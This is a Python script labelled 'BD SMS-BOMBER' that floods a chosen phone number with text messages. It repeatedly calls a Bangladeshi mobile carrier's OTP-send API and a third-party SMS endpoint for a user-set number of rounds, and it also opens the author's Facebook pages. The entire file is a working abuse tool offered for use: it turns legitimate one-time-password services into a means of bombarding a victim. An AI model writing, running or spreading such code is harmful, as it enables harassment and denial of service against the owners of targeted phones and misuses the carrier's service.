#coded by : NOBEL-BK
import os 
import requests
from concurrent.futures import ThreadPoolExecutor as bff 
import sys
send=0 
#----------------

def logo():
    x = """
\x1b[1;83m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
----------BD SMS-BOMBER------------
\033[1;92m  __  __   _   _  _   _   ___ _   _ ____
\033[1;93m |  \/  | /_\ | || | /_\ | __| | | |_  /
\033[1;97m | |\/| |/ _ \| __ |/ _ \| _|| |_| |/ / 
\033[1;92m |_|  |_/_/ \_\_||_/_/ \_\_|  \___//___|
\x1b[1;83m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   
 """
    print(x)
def linex():
    print("-"*40)
def main():
    os.system('clear')
    logo()
    linex()
    print("[A]> BD SMS-BOMBER-[]")
    os.system('xdg-open https://www.facebook.com/1kingmahafuz')
    print("[B]> JOIN GROUP")
    x2 = input("[=]> SELECT : ")
    if x2.lower() == "a":
        x3 = input("[=]> ENTER NUMBER ━━━━━>: ")
        x4 = input("[=]> ENTER LIMIT ━━━━━>: ")
        os.system('xdg-open https://www.facebook.com/1kingmahafuz')
        linex()
        if x4.isdigit():
            with bff(max_workers=120) as minhutanhu:
                try:
                    minhutanhu.submit(boom, x3, x4)
                except Exception as e:
                    print(e)
        else:
            main() 
    elif x2.lower() == "b":
        os.system("xdg-open https://facebook.com/groups/2mahafuz/")
        main()
    else:
        main()
def boom(nmbr, lmt):
    global send
    try:
        for i in range(int(lmt)):
            head1 = {
                'Host': 'da-api.robi.com.bd',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; i68 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/387.0.0.13.114;]' 'python-requests/2.31.0',
                'Accept': 'application/json',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json'
            }
            data1 = {'msisdn': nmbr}
            url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
            url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
            req1 = requests.post(url1, headers=head1, json=data1)
            req2 = requests.get(url2)
            if req1.status_code == 200:
                send += 1
                print(f"\r[MR-MAHAFUZ-1]>  : [100]>[{send}]")
                linex()
            else:
                pass 
            if req2.status_code == 200:
                send += 1 
                print(f"\r[MR-MAHAFUZ-SEND-2]> STATUS : [100]>[{send}]")
                linex()
            else:
                 pass
    except Exception as e:
        print(e)

main()